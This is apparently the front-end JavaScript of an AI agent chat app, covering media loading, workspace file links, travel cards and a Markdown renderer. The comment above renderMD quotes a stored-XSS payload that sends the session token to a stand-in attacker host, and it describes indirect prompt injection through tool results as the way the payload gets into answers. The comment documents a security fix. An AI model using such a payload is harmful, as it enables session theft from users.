/* =========================================================================
   受保护媒体的加载（<img>/<audio> 发不了 Authorization 头）
   ========================================================================= */
const MEDIA_BLOB_CACHE = new Map();   // url -> { promise, objectUrl }
const MEDIA_BLOB_CACHE_MAX = 40;
const MEDIA_BLOB_CACHE_BYTES_MAX = 64 * 1024 * 1024;
const INLINE_VIDEO_MAX_BYTES = 40 * 1024 * 1024;
const WORKSPACE_CODE_EXTENSIONS = new Set(['HTML', 'HTM', 'JS', 'MJS', 'CJS', 'CSS', 'TS', 'TSX', 'JSX',
    'JSON', 'PY', 'JAVA', 'GO', 'RS', 'C', 'H', 'CPP', 'HPP', 'SH', 'BAT', 'PS1', 'SQL', 'XML', 'YML', 'YAML']);
const WORKSPACE_FILE_CHECKS = new Map();
let mediaBlobCacheBytes = 0;
const MEDIA_EVENT_BINDINGS = new WeakSet();

/**
 * 同一个 URL 只取一次，重新渲染出来的新节点直接复用 objectURL。
 * 失败不入缓存（下次重试），并删掉自己占的位置。
 */
function protectedMediaBlob(url) {
    const cached = MEDIA_BLOB_CACHE.get(url);
    if (cached) return cached.promise;
    const entry = { promise: null, objectUrl: null };
    MEDIA_BLOB_CACHE.set(url, entry);
    entry.promise = fetch(url, { credentials: 'same-origin' })
        .then(resp => {
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            const type = (resp.headers.get('Content-Type') || '').toLowerCase();
            const length = Number(resp.headers.get('Content-Length'));
            if (type.startsWith('video/') && Number.isFinite(length) && length > INLINE_VIDEO_MAX_BYTES) {
                resp.body?.cancel();
                throw new Error('视频超过 40 MB，暂不内联预览');
            }
            return resp.blob();
        })
        .then(blob => {
            if (blob.type.startsWith('video/') && blob.size > INLINE_VIDEO_MAX_BYTES)
                throw new Error('视频超过 40 MB，暂不内联预览');
            entry.objectUrl = URL.createObjectURL(blob);
            entry.byteLength = blob.size;
            mediaBlobCacheBytes += entry.byteLength;
            evictMediaBlobCache();
            return entry.objectUrl;
        })
        .catch(err => {
            MEDIA_BLOB_CACHE.delete(url);
            throw err;
        });
    evictMediaBlobCache();
    return entry.promise;
}

function evictMediaBlobCache() {
    while (MEDIA_BLOB_CACHE.size > MEDIA_BLOB_CACHE_MAX
            || (MEDIA_BLOB_CACHE.size > 1 && mediaBlobCacheBytes > MEDIA_BLOB_CACHE_BYTES_MAX)) {
        const [oldUrl, old] = MEDIA_BLOB_CACHE.entries().next().value;
        MEDIA_BLOB_CACHE.delete(oldUrl);
        if (old.objectUrl) {
            mediaBlobCacheBytes = Math.max(0, mediaBlobCacheBytes - (old.byteLength || 0));
            URL.revokeObjectURL(old.objectUrl);
        }
    }
}

/** 把 root 下所有 data-auth-src 元素挂上真实 src。 */
function hydrateProtectedMedia(root) {
    if (!root || !root.querySelectorAll) return;
    hydrateWorkspaceFileReferences(root);
    // Local history may contain a blob URL from an earlier process. Always keep
    // the canonical protected URL and resolve it against this process's cache.
    const origins = [...root.querySelectorAll('[data-media-origin]')];
    if (root.matches?.('[data-media-origin]')) origins.push(root);
    origins.forEach(el => {
        const url = safeMediaUrl(el.getAttribute('data-media-origin'));
        if (!url.startsWith('/api/')) return;
        const cached = MEDIA_BLOB_CACHE.get(url);
        if (!cached?.objectUrl || el.getAttribute('src') !== cached.objectUrl) el.setAttribute('data-auth-src', url);
    });
    const mediaNodes = [...root.querySelectorAll('audio,video,img[data-media-poster]')];
    if (root.matches?.('audio,video,img[data-media-poster]')) mediaNodes.push(root);
    mediaNodes.forEach(el => {
        if (MEDIA_EVENT_BINDINGS.has(el)) return;
        MEDIA_EVENT_BINDINGS.add(el);
        el.addEventListener('loadedmetadata', () => {
            el.removeAttribute('data-media-error');
            el.parentNode?.querySelector('.media-preview-error')?.remove();
        });
        el.addEventListener('error', () => {
            if (el.tagName === 'IMG') el.hidden = true;
            else showMediaPreviewError(el, el.dataset.mediaUrl || el.getAttribute('src'), '当前资源暂无法播放，请打开原网页或下载文件。');
        });
    });
    const protectedNodes = [...root.querySelectorAll('[data-auth-src]')];
    if (root.matches?.('[data-auth-src]')) protectedNodes.push(root);
    protectedNodes.forEach(el => {
        const url = el.getAttribute('data-auth-src');
        if (!url) return;
        el.removeAttribute('data-auth-src');   // 同一节点只排队一次
        protectedMediaBlob(url).then(objectUrl => {
            // 流式重绘可能已经把节点换掉了，别往废弃节点上写
            if (el.isConnected) el.src = objectUrl;
        }).catch(err => {
            el.setAttribute('data-media-error', '1');
            if (el.tagName === 'VIDEO' || el.tagName === 'AUDIO') showMediaPreviewError(el, url,
                err.message.includes('40 MB') ? '视频超过 40 MB，请下载后播放。' : '媒体加载失败，请下载文件或打开原网页。');
            else if (el.matches?.('[data-media-poster]')) el.hidden = true;
            console.warn('受保护媒体加载失败:', url, err.message);
        });
    });
}

function showMediaPreviewError(el, sourceUrl, message) {
    const parent = el.parentNode;
    if (!parent || parent.querySelector('.media-preview-error')) return;
    const fallback = document.createElement('div');
    fallback.className = 'media-preview-error';
    fallback.setAttribute('role', 'status');
    fallback.textContent = message;
    sourceUrl = typeof sourceUrl === 'string' ? sourceUrl : '';
    if (sourceUrl.startsWith('/api/conversation-media/')) {
        const filename = sourceUrl.split('/').pop().split('?')[0];
        appendAuthenticatedDownload(fallback, '/api/conversation-download/' + sourceUrl.split('/')[3] + '/' + filename,
            decodeURIComponentSafe(filename));
    } else if (sourceUrl.startsWith('/api/workspace-media/')) {
        const filename = sourceUrl.split('/').pop().split('?')[0];
        const query = sourceUrl.includes('?') ? sourceUrl.slice(sourceUrl.indexOf('?')) : '';
        appendAuthenticatedDownload(fallback, '/api/workspace-download/' + filename + query, decodeURIComponentSafe(filename));
    } else if (sourceUrl.startsWith('/api/generated-media/')) {
        appendAuthenticatedDownload(fallback, sourceUrl, decodeURIComponentSafe(sourceUrl.split('/').pop()));
    } else {
        const url = safeMediaPageUrl(sourceUrl);
        if (url) {
            const link = document.createElement('a');
            link.href = url; link.target = '_blank'; link.rel = 'noopener noreferrer';
            link.textContent = '打开媒体链接';
            fallback.appendChild(link);
        }
    }
    parent.appendChild(fallback);
}

function appendAuthenticatedDownload(parent, url, name) {
    const link = document.createElement('a');
    link.href = '#';
    link.className = 'conversation-download-link';
    link.dataset.authDownload = url;
    link.dataset.downloadName = name || 'media';
    link.textContent = '下载文件';
    parent.appendChild(link);
}

/** A filename is a reference until the owner-scoped endpoint confirms a real file. */
function hydrateWorkspaceFileReferences(root) {
    const candidates = root.matches && root.matches('[data-workspace-file-check]') ? [root] : [];
    candidates.push(...root.querySelectorAll('[data-workspace-file-check]'));
    candidates.forEach(link => {
        const url = link.getAttribute('data-workspace-file-check');
        if (!url) return;
        link.removeAttribute('data-workspace-file-check');
        let check = WORKSPACE_FILE_CHECKS.get(url);
        if (!check || Date.now() - check.createdAt > 30000) {
            check = {
                createdAt: Date.now(),
                promise: fetch(url, { method: 'HEAD', credentials: 'same-origin' })
                    .then(response => response.status).catch(() => 0)
            };
            WORKSPACE_FILE_CHECKS.set(url, check);
            if (WORKSPACE_FILE_CHECKS.size > 100) WORKSPACE_FILE_CHECKS.delete(WORKSPACE_FILE_CHECKS.keys().next().value);
        }
        check.promise.then(status => {
            if (!link.isConnected) return;
            const hint = link.querySelector('small');
            const type = link.getAttribute('data-file-type') || '文件';
            if (status >= 200 && status < 300) {
                link.setAttribute('data-auth-download', url);
                link.removeAttribute('aria-disabled');
                link.title = '下载文件';
                if (hint) hint.textContent = type + ' · 点击下载';
            } else {
                link.removeAttribute('href');
                link.setAttribute('aria-disabled', 'true');
                link.title = '回复中的文件引用；当前会话工作区未提供这个文件。';
                if (hint) hint.textContent = status === 401 ? type + ' · 请登录后查看'
                    : status === 0 || status >= 500 ? type + ' · 暂时无法确认文件'
                        : type + ' · 文件引用，未提供下载';
            }
        });
    });
}

function decodeURIComponentSafe(value) {
    try { return decodeURIComponent(value); } catch (_) { return value; }
}

/* 流式渲染、历史回放、整段重画都会新建节点 —— 用观察器统一接管，免得到处记得调用。 */
(function observeProtectedMedia() {
    const start = () => {
        hydrateProtectedMedia(document.body);
        new MutationObserver(mutations => {
            mutations.forEach(m => m.addedNodes.forEach(node => {
                if (node.nodeType !== 1) return;
                hydrateProtectedMedia(node.hasAttribute && node.hasAttribute('data-auth-src')
                    ? node.parentNode : node);
            }));
        }).observe(document.body, { childList: true, subtree: true });
    };
    if (document.body) start();
    else document.addEventListener('DOMContentLoaded', start);
})();

function parseBracketImg(s, label) {
    const needle = '[' + label + '](';
    let out = '', i = 0;
    while (i < s.length) {
        const p = s.indexOf(needle, i);
        if (p === -1) { out += s.slice(i); break; }
        out += s.slice(i, p);
        const u = balancedUrl(s, p + needle.length - 1);
        if (!u) { out += s[p]; i = p + 1; continue; }
        const url = u.url.replace(/&amp;/g, '&');
        if (!/^https?:\/\//i.test(url)) { out += s.slice(p, u.end + 1); i = u.end + 1; continue; }
        out += `<img src="${escA(url)}" alt="${escA(label)}" referrerpolicy="no-referrer" loading="lazy">`;
        i = u.end + 1;
    }
    return out;
}

/** 把 write_file 回报的 workspace/扁平文件路径换成受认证的下载 URL。 */
function workspaceDownloadPath(href) {
    const match = String(href).match(/^workspace\/([^/?#]+)$/i);
    if (!match) return null;
    let name;
    try { name = decodeURIComponent(match[1]); } catch (_) { return null; }
    if (!name || name.startsWith('.') || name.includes('..') || /[\/\\<>:"|?*\x00-\x1f]/.test(name)) return null;
    return encodeURIComponent(name).replace(/%2E/gi, '.').replace(/%2D/gi, '-').replace(/%5F/gi, '_');
}

/**
 * 下载地址上的会话参数。
 *
 * 会话可以绑定自己的工作目录，文件就不在默认工作区里了；不带 sid 时端点只能在
 * {数据根}/workspace 下找，链接必然 404。没有当前会话时不加参数（等同于默认工作区）。
 */
function workspaceSidQuery() {
    return currentId ? '?sid=' + encodeURIComponent(currentId) : '';
}

function workspaceFileDownloadLink(workspacePath, downloadName, explicitUrl, displayLabel) {
    if (!currentId) return '<code>' + esc(downloadName) + '</code>';
    const ext = fileExt(downloadName).toUpperCase() || 'FILE';
    const isMarkdown = ['MD', 'MDOWN', 'MARKDOWN'].includes(ext);
    const isCode = WORKSPACE_CODE_EXTENSIONS.has(ext);
    const officeKind = ['DOC', 'DOCX', 'ODT', 'RTF'].includes(ext) ? 'word'
        : ['XLS', 'XLSX', 'ODS', 'CSV'].includes(ext) ? 'excel'
            : ext === 'PDF' ? 'pdf'
                : ['PPT', 'PPTX', 'ODP'].includes(ext) ? 'slides' : '';
    const fileIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 2.8h8l4 4V21H6z"/><path d="M14 2.8v4h4"/></svg>`;
    const icon = isMarkdown
        ? `${fileIcon}<b>MD</b>`
        : isCode ? `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m8 8-4 4 4 4M16 8l4 4-4 4M14 5l-4 14"/></svg><b>${esc(ext.slice(0, 4))}</b>`
            : `${fileIcon}<b>${esc(ext.slice(0, 4))}</b>`;
    const typeLabel = isMarkdown ? 'Markdown 文档'
        : ext === 'HTML' || ext === 'HTM' ? 'HTML 页面'
            : ['JS', 'MJS', 'CJS'].includes(ext) ? 'JavaScript 源码'
                : ext === 'CSS' ? 'CSS 样式表'
                    : ext === 'JSON' ? 'JSON 数据文件'
                        : officeKind === 'word' ? 'Word 文档'
                            : officeKind === 'excel' ? 'Excel 表格'
                                : officeKind === 'pdf' ? 'PDF 文档'
                                    : officeKind === 'slides' ? '演示文稿'
                                        : isCode ? `${ext} 源码文件` : `${ext} 文件`;
    const hint = `${typeLabel} · 正在确认文件`;
    const url = explicitUrl || '/api/workspace-download/' + workspacePath + workspaceSidQuery();
    const typeClass = officeKind ? ` workspace-download-link--${officeKind}` : '';
    const iconClass = officeKind ? ` workspace-file-ext--${officeKind}` : '';
    // displayLabel comes from parseLinks after renderMD's full HTML escaping;
    // filenames are raw path data and must always pass esc() separately.
    const title = displayLabel && !/^查看文件(?:[:：]|$)/.test(displayLabel) ? displayLabel : esc(downloadName);
    return `<a href="#" data-workspace-file-check="${escA(url)}" data-file-type="${escA(typeLabel)}" aria-disabled="true" data-download-name="${escA(downloadName)}" class="workspace-download-link workspace-file-chip${isMarkdown ? ' workspace-download-link--markdown' : ''}${isCode ? ' workspace-download-link--code' : ''}${typeClass}" rel="nofollow"><span class="workspace-file-ext${isMarkdown ? ' workspace-file-ext--markdown' : ''}${isCode ? ' workspace-file-ext--code' : ''}${iconClass}">${icon}</span><span class="workspace-file-label"><span class="workspace-file-name">${title}</span><small>${hint}</small></span></a>`;
}

/** 工作区交付物的行内文件名使用卡片展示；兼容 MD、源码、网页和常见文档格式。 */
function inlineMarkdownFileLink(codeText, displayLabel) {
    const token = String(codeText || '').trim().replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
    if (!/\.(?:md|markdown|mdown|html?|css|m?js|cjs|tsx?|jsx|json|py|java|go|rs|c|h|cpp|hpp|sh|bat|ps1|sql|xml|ya?ml|txt|csv|pdf|docx?|xlsx?|pptx?)$/i.test(token)) return null;
    const pathToken = token.startsWith('workspace/') ? token : 'workspace/' + token;
    const workspacePath = workspaceDownloadPath(pathToken);
    if (workspacePath) {
        const downloadName = decodeURIComponentSafe(workspacePath);
        return workspaceFileDownloadLink(workspacePath, downloadName, null, displayLabel);
    }
    // Nested and absolute references are resolved only inside this user's session
    // workspace. The API rejects references outside that boundary.
    const normalized = token.replace(/\\/g, '/');
    const relative = normalized.replace(/^workspace\//i, '');
    if (/^(?:https?:|file:|\/\/)/i.test(normalized)) return null;
    const checkPath = relative.replace(/^[a-z]:\//i, '');
    if (/[<>:"|?*\x00-\x1f]/.test(checkPath)
            || checkPath.split('/').some(part => part === '..' || part.startsWith('.'))) return null;
    const name = normalized.split('/').pop();
    if (!name) return null;
    const url = '/api/workspace-download?path=' + encodeURIComponent(relative)
        + (currentId ? '&sid=' + encodeURIComponent(currentId) : '');
    return workspaceFileDownloadLink(null, name, url, displayLabel);
}

/** 回复常把 write_file 返回的 workspace/文件名作为普通文本，而非 Markdown 链接。 */
function linkWorkspacePaths(s) {
    const text = String(s);
    const protectedRanges = [];
    // 已有 Markdown 链接的 label/url 以及图片语法不可再改写，否则会嵌套出错误链接。
    const markdownLink = /!?\[[^\]]*\]\([^)]*\)/g;
    let existing;
    while ((existing = markdownLink.exec(text)) !== null) {
        protectedRanges.push([existing.index, existing.index + existing[0].length]);
    }
    const pathPattern = /(^|[\s:：])workspace\/([^\s<>"'`()（）]+)(?=$|[\s),，。；;）])/g;
    const sourceLines = text.split('\n');
    let lineStart = 0;
    const candidates = [];
    for (const line of sourceLines) {
        const heading = /(^|[\s:：])(workspace\/[^\s<>"'`()（）]+)(?=$|[\s),，。；;（）])/g;
        let item;
        while ((item = heading.exec(line)) !== null) {
            const start = lineStart + item.index + item[1].length;
            const end = start + item[2].length;
            const before = text.slice(0, start);
            const openTag = before.lastIndexOf('<');
            const closeTag = before.lastIndexOf('>');
            const inCode = before.lastIndexOf('<code>') > before.lastIndexOf('</code>')
                || before.lastIndexOf('<pre>') > before.lastIndexOf('</pre>');
            if (openTag <= closeTag && !inCode
                    && !protectedRanges.some(range => start >= range[0] && start < range[1])) {
                candidates.push({ start, end, token: item[2] });
            }
        }
        lineStart += line.length + 1;
    }
    let out = '', cursor = 0;
    for (const candidate of candidates) {
        const href = workspaceDownloadPath(candidate.token);
        if (!href) {
            if (inlineMarkdownFileLink(candidate.token)) {
                out += text.slice(cursor, candidate.start) + '[查看文件](' + candidate.token + ')';
                cursor = candidate.end;
            }
            continue;
        }
        let displayName = candidate.token.slice('workspace/'.length);
        try { displayName = decodeURIComponent(displayName); } catch (_) { }
        const ext = fileExt(displayName);
        const mediaUrl = '/api/workspace-media/' + href + workspaceSidQuery();
        const isImage = ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'bmp', 'avif'].includes(ext);
        const isVideo = isVideoUrl(displayName);
        if (isImage || isVideo || isAudioUrl(displayName)) {
            out += text.slice(cursor, candidate.start) + '![' + displayName + '](' + mediaUrl + ')';
        } else {
            out += text.slice(cursor, candidate.start) + '[查看文件：' + displayName
                + '](workspace/' + href + ')';
        }
        cursor = candidate.end;
    }
    return cursor ? out + text.slice(cursor) : text;
}

function parseLinks(s) {
    let out = '', i = 0;
    while (i < s.length) {
        // Markdown 渲染前面已经生成安全标签。保留标签属性原样，绝不在 href/src 里再次识别 URL。
        if (s[i] === '<') {
            const tagEnd = s.indexOf('>', i + 1);
            if (tagEnd !== -1) {
                const tag = s.slice(i, tagEnd + 1);
                const tagName = (tag.match(/^<\/?([a-z0-9-]+)/i) || [])[1]?.toLowerCase();
                if (tagName === 'code' || tagName === 'pre' || tagName === 'a') {
                    const closeAt = s.toLowerCase().indexOf('</' + tagName + '>', tagEnd + 1);
                    const end = closeAt === -1 ? tagEnd + 1 : closeAt + tagName.length + 3;
                    out += s.slice(i, end);
                    i = end;
                    continue;
                }
                out += tag;
                i = tagEnd + 1;
                continue;
            }
        }

        if (s[i] === '[' && !(i > 0 && s[i - 1] === '!')) {
            const rb = s.indexOf(']', i + 1);
            if (rb !== -1 && s[rb + 1] === '(') {
                const label = s.slice(i + 1, rb);
                const u = balancedUrl(s, rb + 1);
                if (u) {
                    const href = u.url.replace(/&amp;/g, '&');
                    const workspacePath = workspaceDownloadPath(href);
                    const mediaUrl = workspacePath ? '/api/workspace-media/' + workspacePath + workspaceSidQuery() : safeMediaUrl(href);
                    if (mediaUrl && (isAudioUrl(mediaUrl) || isVideoUrl(mediaUrl))) {
                        out += renderNativeMedia(mediaUrl, isAudioUrl(mediaUrl) ? 'audio' : 'video', label.replace(/<[^>]*>/g, ''), '');
                    } else if (workspacePath) {
                        let downloadName = workspacePath;
                        try { downloadName = decodeURIComponent(workspacePath); } catch (_) { }
                        out += workspaceFileDownloadLink(workspacePath, downloadName, null, label);
                    } else if (!/^(?:https?:|\/\/|\/api\/)/i.test(href) && inlineMarkdownFileLink(href)) {
                        out += inlineMarkdownFileLink(href, label);
                    } else if (!safeMediaPageUrl(href) && (!/^\/(?!\/|\\)[\w/-]/.test(href) || /[\x00-\x20\\]/.test(href))) {
                        out += s.slice(i, u.end + 1);
                    } else {
                        out += `<a href="${escA(href)}" target="_blank" rel="noopener noreferrer">${label}</a>`;
                    }
                    i = u.end + 1;
                    continue;
                }
            }
        }

        if (/^https?:\/\//i.test(s.slice(i, i + 8))
                && (i === 0 || !/[\w/.%-]/.test(s[i - 1]))) {
            let end = i;
            while (end < s.length && !/[\s<>"'`|]/.test(s[end])) end++;
            let url = s.slice(i, end);
            while (/[.,!?;:，。；！？、]$/.test(url)) url = url.slice(0, -1);
            while (url.endsWith(')') && (url.match(/\)/g) || []).length > (url.match(/\(/g) || []).length)
                url = url.slice(0, -1);
            while (url.endsWith(']') && (url.match(/\]/g) || []).length > (url.match(/\[/g) || []).length)
                url = url.slice(0, -1);
            const href = safeMediaPageUrl(url.replace(/&amp;/g, '&'));
            if (url.length > 8 && href) {
                out += isAudioUrl(href) || isVideoUrl(href)
                    ? renderNativeMedia(href, isAudioUrl(href) ? 'audio' : 'video', '', '')
                    : `<a href="${escA(href)}" target="_blank" rel="noopener noreferrer" class="source-link">查看原文</a>`;
                i += url.length;
                continue;
            }
        }

        out += s[i];
        i++;
    }
    return out;
}

function groupAdjacentMedia(markup) {
    const media = '(?:<img\\b[^>]*>|<video\\b[^>]*><\\/video>)';
    const pair = new RegExp(media + '(?:(?:\\s|<br\\s*\\/?\\s*>)*' + media + ')+', 'gi');
    return markup.replace(pair, group => '<div class="media-gallery">'
        + group.replace(/<br\s*\/?\s*>/gi, '').replace(/\s+(?=<)/g, '')
        + '</div>');
}

function travelCardText(value, fallback = '—') {
    if (value === null || value === undefined || value === '') return fallback;
    return esc(String(value).slice(0, 160));
}

function travelCardSource(value) {
    if (!value || typeof value !== 'object' || typeof value.url !== 'string') return '';
    try {
        const url = new URL(value.url);
        if (!['http:', 'https:'].includes(url.protocol) || url.username || url.password) return '';
        const label = travelCardText(value.label, '查看来源');
        return `<a class="travel-source-link" href="${escA(url.toString())}" target="_blank" rel="noopener noreferrer">${label}</a>`;
    } catch (_) {
        return '';
    }
}

/** Render the opt-in JSON card protocol used by the bundled travel-search skill. */
function renderTravelCardBlock(language, rawJson) {
    const kind = String(language || '').toLowerCase();
    if (kind !== 'miniagent-flight' && kind !== 'miniagent-train') return null;
    if (rawJson.length > 100_000) return null;
    let data;
    try { data = JSON.parse(rawJson); } catch (_) { return null; }
    if (!data || typeof data !== 'object' || Array.isArray(data)) return null;
    const route = data.route && typeof data.route === 'object' ? data.route : {};
    const from = travelCardText(route.from, '出发地待确认');
    const to = travelCardText(route.to, '目的地待确认');
    const date = travelCardText(route.date, '日期待确认');
    const source = travelCardSource(data.source);
    const flightMode = kind === 'miniagent-flight';
    const items = data[flightMode ? 'flights' : 'trains'];
    if (!Array.isArray(items)) return null;
    const title = flightMode ? '航班查询' : '车次查询';
    const routeLabel = flightMode ? '航线' : '行程';
    let cards = '';
    items.slice(0, 8).forEach(item => {
        if (!item || typeof item !== 'object' || Array.isArray(item)) return;
        const id = travelCardText(item.flightNo || item.trainNo || item.number, flightMode ? '航班' : '车次');
        const depart = travelCardText(item.departureTime);
        const arrive = travelCardText(item.arrivalTime);
        const duration = travelCardText(item.duration, '时长待核实');
        const departPlace = travelCardText(item.departureAirport || item.departureStation);
        const arrivePlace = travelCardText(item.arrivalAirport || item.arrivalStation);
        const carrier = travelCardText(item.airline || item.operator || (flightMode ? '' : id));
        const cabin = travelCardText(item.cabin || item.seatClass, '席别待核实');
        const price = travelCardText(item.price, flightMode ? '价格待核实' : '票价见席别');
        const extra = flightMode
            ? `<div class="travel-item-meta">${carrier} <span>·</span> ${id} <span>·</span> ${cabin}${item.aircraft ? ` <span>·</span> ${travelCardText(item.aircraft)}` : ''}${item.remaining ? ` <span>·</span> ${travelCardText(item.remaining)}` : ''}</div>`
            : `<div class="travel-item-meta">${carrier} <span>·</span> ${id}</div>`;
        let seats = '';
        if (!flightMode && Array.isArray(item.seats)) {
            seats = `<div class="travel-seat-list">${item.seats.slice(0, 5).map(seat => {
                if (!seat || typeof seat !== 'object') return '';
                const seatName = travelCardText(seat.name || seat.class, '席别');
                const remaining = travelCardText(seat.remaining, '余票待核实');
                const seatPrice = travelCardText(seat.price, '价格待核实');
                return `<span class="travel-seat">${seatName}<small>${remaining}</small><b>${seatPrice}</b></span>`;
            }).join('')}</div>`;
        }
        const itemSource = travelCardSource(item.source);
        cards += `<article class="travel-option">
            <div class="travel-option-top"><span class="travel-carrier">${carrier}</span><span class="travel-price">${price}</span></div>
            <div class="travel-journey">
                <div class="travel-point"><strong>${depart}</strong><span>${departPlace}</span></div>
                <div class="travel-duration"><span>${duration}</span><i></i></div>
                <div class="travel-point"><strong>${arrive}</strong><span>${arrivePlace}</span></div>
            </div>
            ${extra}${seats}${itemSource ? `<div class="travel-item-source">来源：${itemSource}</div>` : ''}
        </article>`;
    });
    if (!cards) cards = '<div class="travel-empty">没有可展示的已核验班次，请查看来源或补充出发日期。</div>';
    return `<section class="travel-result-card ${flightMode ? 'travel-result-card--flight' : 'travel-result-card--train'}" aria-label="${title}">
        <header class="travel-card-heading"><span class="travel-card-icon" aria-hidden="true">${flightMode ? '✈' : '🚄'}</span><div><strong>${title}</strong><small>${routeLabel}：${from} → ${to}　·　${date}</small></div>${source}</header>
        <div class="travel-options">${cards}</div>
    </section>`;
}

/**
 * Markdown → HTML。
 *
 * 安全前提（顺序不可调换）：先全文 HTML 转义，再做结构化标记。
 *
 * 旧实现直接对原文跑正则并把 `$1` 拼进 HTML，只有 fenced code 走了 esc()，
 * 于是模型答案里的 `<img src=x onerror="fetch('//attacker/?t='+sessionStorage.ma_token)">`
 * 会原样进入 innerHTML —— 答案会落库，所以是**存储型** XSS：每次重新打开该会话都再次执行，
 * 而同源下可读走会话令牌。工具结果（网页正文、文件内容、MCP 输出）都能被复述进答案，
 * 因此攻击者不必是受害者本人（间接提示注入即可）。
 *
 * 现在固定为四步：摘出代码块 → 全文转义 → 结构化替换（插值已是转义文本）→ 还原代码块。
 * 任何新增规则都必须落在这条顺序里，不得再插入未转义的原文。
 */
function renderMD(t) {
    if (t == null) return '';
    t = String(t).replace(/\r\n?/g, '\n');

    // 1) 摘出 fenced code：内容不参与 markdown 结构替换，也不会被二次转义
    const codeBlocks = [];
    t = t.replace(/```([\w-]*)\n([\s\S]*?)```/g, (_, lang, code) => {
        const card = renderMediaCardBlock(lang, code) || renderTravelCardBlock(lang, code);
        if (card) {
            codeBlocks.push({ rendered: card });
        } else {
            codeBlocks.push({ lang: lang || 'code', code: code });
        }
        return '\u0000CB' + (codeBlocks.length - 1) + '\u0000';
    });
    // A streamed or interrupted protocol payload must never expose partial JSON to the conversation.
    t = t.replace(/```miniagent-media\b[^\n]*\n[\s\S]*$/i, () => {
        codeBlocks.push({ rendered: '<div class="media-card-pending" role="status">正在整理媒体内容…</div>' });
        return '\u0000CB' + (codeBlocks.length - 1) + '\u0000';
    });

    // 2) 全文转义：此后所有 $1 插值都是安全文本
    t = esc(t);

    // Inline code and file-card markup must not participate in later emphasis
    // replacement: start_*.bat is literal, never a start_<em>.bat download URL.
    const inlineBlocks = [];
    t = t.replace(/`([^`]+)`/g, (match, codeText, offset, source) => {
        inlineBlocks.push(renderMarkdownCodeToken(codeText, source, offset, match.length));
        return '\u0000IC' + (inlineBlocks.length - 1) + '\u0000';
    });
    t = t.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
    t = t.replace(/\*(.+?)\*/g, '<em>$1</em>');
    t = t.replace(/^### (.+)$/gm, '<h3>$1</h3>');
    t = t.replace(/^## (.+)$/gm, '<h2>$1</h2>');
    t = t.replace(/^# (.+)$/gm, '<h1>$1</h1>');
    t = t.replace(/^---$/gm, '<hr>');

    // 引用块：> text（转义后行首是 &gt;，支持多行连续引用）
    t = t.replace(/(^&gt; .+$\n?)+/gm, m => {
        const inner = m.replace(/^&gt; /gm, '').trim();
        return `<blockquote>${inner}</blockquote>`;
    });

    // 表格：| header | header |\n|---|---|\n| cell | cell |
    t = t.replace(/(^(\|.+\|)\n(\|[-:| ]+\|)\n((\|.+\|)\n?)*)/gm, m => {
        const rows = m.trim().split('\n').filter(r => r.trim());
        if (rows.length < 2) return m;
        // 检测分隔行
        const sepIdx = rows.findIndex(r => /^\|[-:| ]+\|$/.test(r.trim()));
        if (sepIdx < 0) return m;
        const headerRows = rows.slice(0, sepIdx);
        const bodyRows = rows.slice(sepIdx + 1);
        function parseCells(line) {
            return line.split('|').slice(1, -1).map(c => c.trim());
        }
        let html = '<table><thead>';
        headerRows.forEach(r => {
            html += '<tr>' + parseCells(r).map(c => `<th>${c}</th>`).join('') + '</tr>';
        });
        html += '</thead><tbody>';
        bodyRows.forEach(r => {
            html += '<tr>' + parseCells(r).map(c => `<td>${c}</td>`).join('') + '</tr>';
        });
        html += '</tbody></table>';
        return html;
    });

    t = linkWorkspacePaths(t);
    t = parseMediaBang(t);
    t = parseBracketImg(t, '图片');
    t = parseLinks(t);
    t = groupAdjacentMedia(t);
    t = t.replace(/^- (.+)$/gm, '<li>$1</li>');
    t = t.replace(/^\d+\. (.+)$/gm, '<li>$1</li>');
    t = t.replace(/(<li>[\s\S]*?<\/li>\n?)+/g, m => `<ul>${m}</ul>`);
    t = t.replace(/\n\n+/g, '</p><p>');
    t = t.replace(/\n/g, '<br>');
    // 清理多余的 <br> 紧跟块元素
    t = t.replace(/<br>(<\/?(h[1-3]|ul|ol|li|blockquote|table|thead|tbody|tr|th|td|pre|hr)[^>]*>)/gi, '$1');
    t = t.replace(/(<\/?(h[1-3]|ul|ol|li|blockquote|table|thead|tbody|tr|th|td|pre|hr)[^>]*>)<br>/gi, '$1');

    // 4) 还原代码块：内容转义；语言名只保留 [\w-] 再拼进 class，避免属性逃逸
    t = t.replace(/\u0000IC(\d+)\u0000/g, (_, idx) => inlineBlocks[Number(idx)] || '');
    t = t.replace(/\u0000CB(\d+)\u0000/g, (_, idx) => {
        const b = codeBlocks[Number(idx)];
        if (!b) return '';
        if (b.rendered) return b.rendered;
        const lang = String(b.lang).replace(/[^\w-]/g, '') || 'code';
        return `<pre><div class="code-hdr"><span>${esc(b.lang)}</span>`
            + `<button class="code-copy" onclick="copyCode(this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>复制</button></div>`
            + `<code class="lang-${lang}">${esc(b.code)}</code></pre>`;
    });

    if (!t.startsWith('<')) t = '<p>' + t + '</p>';
    return layoutMarkdownFiles(t);
}

function copyCode(btn) {
    const code = btn.closest('pre').querySelector('code');
    navigator.clipboard.writeText(code.innerText).then(() => {
        btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><path d="M20 6L9 17l-5-5"/></svg>已复制';
        setTimeout(() => {
            btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>复制';
        }, 2000);
    });
}

